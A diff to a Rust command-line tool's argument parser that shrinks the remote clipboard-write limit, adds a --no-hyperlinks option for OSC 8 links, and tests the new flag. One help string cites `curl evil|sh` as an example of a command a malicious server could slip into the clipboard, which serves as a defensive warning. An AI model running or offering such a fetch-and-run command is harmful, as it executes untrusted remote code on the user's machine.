@@ -196,7 +196,11 @@ fn connect() -> Command {
         )
         .arg(
             flag("no_clipboard", "no-clipboard")
-                .help("Ignore the remote app's OSC-52 clipboard writes. By default they set your system clipboard (base64 only, at most 1 MiB, never read back), so a remote app's \"copy\" works; but a malicious or compromised server can then replace what you copied (a command for `curl evil|sh`, say). Use this when you do not trust the server"),
+                .help("Ignore the remote app's OSC-52 clipboard writes. By default they set your system clipboard (base64 only, at most 16 KiB, never read back), so a remote app's \"copy\" works; but a malicious or compromised server can then replace what you copied (a command for `curl evil|sh`, say). Use this when you do not trust the server"),
+        )
+        .arg(
+            flag("no_hyperlinks", "no-hyperlinks")
+                .help("Paint the remote app's hyperlinks (OSC 8) as plain text. By default they are painted as links your terminal can open, each checked first: printable ASCII only, within fux-vt's limits"),
         )
         .arg(
             Arg::new("on_bell")
@@ -263,6 +267,7 @@ pub fn parse(matches: &ArgMatches) -> Result<Cmd, clap::Error> {
             direct: m.get_one::<SocketAddr>("direct").copied(),
             relay_url: m.get_one::<RelayUrl>("relay_url").cloned(),
             clipboard: !m.get_flag("no_clipboard"),
+            hyperlinks: !m.get_flag("no_hyperlinks"),
             bell_command: m.get_one::<String>("on_bell").cloned(),
         })),
         Some(("id", m)) => Ok(Cmd::Key(KeyConfig {
@@ -402,6 +407,19 @@ mod tests {
         assert!(command()
             .try_get_matches_from(["koh", "connect", ID, "--clipboard"])
             .is_err());
+    }
+
+    #[test]
+    fn hyperlinks_are_on_by_default_and_off_with_no_hyperlinks() {
+        let Cmd::Connect(c) = parsed(&["koh", "connect", ID]) else {
+            panic!("connect");
+        };
+        assert!(c.hyperlinks);
+        assert!(koh::client::ConnectConfig::new(c.server).hyperlinks);
+        let Cmd::Connect(c) = parsed(&["koh", "connect", ID, "--no-hyperlinks"]) else {
+            panic!("connect");
+        };
+        assert!(!c.hyperlinks && c.clipboard);
     }
 
     #[test]
